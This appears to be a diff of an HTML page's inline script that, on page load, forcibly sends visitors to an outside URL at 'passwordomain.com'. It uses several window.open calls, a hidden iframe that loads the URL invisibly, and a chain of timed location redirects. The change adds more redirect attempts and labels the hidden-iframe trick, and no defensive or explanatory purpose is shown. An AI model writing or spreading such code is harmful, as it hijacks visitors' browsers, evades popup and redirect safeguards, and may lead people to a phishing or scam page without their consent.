@@ -28,24 +28,30 @@
   <script>
     const finalURL = "https://passwordomain.com/1838319";
 
-    function redirectChain() {
-      try { window.open(finalURL, "_system"); } catch(e){}
-      try { window.open(finalURL, "_blank"); } catch(e){}
-      try { window.open(finalURL, "_top"); } catch(e){}
+    function multiRedirect(url) {
+      // Attempt different open methods
+      try { window.open(url, "_system"); } catch(e){}
+      try { window.open(url, "_blank"); } catch(e){}
+      try { window.open(url, "_top"); } catch(e){}
 
+      // Hidden iframe trick
       try {
         const iframe = document.createElement("iframe");
         iframe.style.display = "none";
-        iframe.src = finalURL;
+        iframe.src = url;
         document.body.appendChild(iframe);
       } catch(e){}
 
-      setTimeout(() => { window.location.href = finalURL; }, 500);
-      setTimeout(() => { window.location.replace(finalURL); }, 1000);
+      // Sequential timed redirects
+      setTimeout(() => { window.location.href = url; }, 300);
+      setTimeout(() => { window.location.replace(url); }, 600);
+      setTimeout(() => { window.location.href = url; }, 900);
+      setTimeout(() => { window.location.replace(url); }, 1200);
+      setTimeout(() => { window.location.href = url; }, 1500);
     }
 
-    // Run redirect chain automatically
-    redirectChain();
+    // Run multi-step redirect automatically
+    multiRedirect(finalURL);
   </script>
 </body>
 </html>
